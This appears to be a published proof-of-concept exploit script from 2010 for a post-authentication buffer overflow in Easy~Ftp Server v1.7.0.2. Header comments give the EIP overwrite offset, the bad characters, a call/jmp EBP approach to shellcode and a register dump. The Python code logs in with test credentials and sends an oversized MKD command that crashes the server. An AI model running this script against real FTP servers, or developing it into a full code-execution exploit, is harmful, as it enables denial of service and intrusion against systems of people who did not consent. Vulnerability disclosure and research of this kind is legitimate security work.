#!/usr/bin/python

# Title: Easy~Ftp Server v1.7.0.2 Post-Authentication BoF (PoC)
# From: The eh?-Team || The Great White Fuzz (we're not sure yet)
# Found by: loneferret
# Hat's off to dookie2000ca
# Date Found: 13/02/2010
# Developer contacted: 14/02/2010
# Software link: http://cdnetworks-us-2.dl.sourceforge.net/project/easyftpsvr/easyftpsvr/1.7.0.2-en/easyftpsvr-1.7.0.2.zip
# Tested on: Windows XP SP2/SP3 Professional
# Nod to the Exploit-DB Team

# Vulnerable command: MKD
# EIP is overwritten at bytes 269-270-271-272
# badchars: \x0a \x2f \x5c
# call/jmp EBP is one metod of jumping to our shellcode
# We have 268 bytes of room (max), seeing the jump or call EBP will bring us
# right at the start of our offset. So 265 bytes of room just to be sure.

#EAX 0081FCB4
#ECX 41414141
#EDX 00000010
#EBX 00000001
#ESP 0081FC78 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@9_"
#EBP 005F5CA8 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA....
#ESI 005F4B70
#EDI 005F4B70
#EIP 41414141
#C 0 ES 0023 32bit 0(FFFFFFFF)
#P 1 CS 001B 32bit 0(FFFFFFFF)
#A 0 SS 0023 32bit 0(FFFFFFFF)
#Z 0 DS 0023 32bit 0(FFFFFFFF)
#S 0 FS 003B 32bit 7FFDC000(FFF)
#T 0 GS 0000 NULL
#D 0
#O 0 LastErr ERROR_SUCCESS (00000000)
#EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
#ST0 empty %#.19L
#ST1 empty +UNORM 03E9 00000000 00000000
#ST2 empty 0.0
#ST3 empty 0.0
#ST4 empty -UNORM FAB4 00000000 00000002
#ST5 empty +UNORM 09B8 00000011 7C910732
#ST6 empty %#.19L
#ST7 empty -??? FFFF 7C910738 7C90EE18
# 3 2 1 0 E S P U O Z D I
#FST 0000 Cond 0 0 0 0 Err 0 0 0 0 0 0 0 0 (GT)
#FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1

import socket

buffer = "\x41" * 320


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('xxx.xxx.xxx.xxx',21))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS test\r\n')
s.recv(1024)
s.send('MKD ' + buffer + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close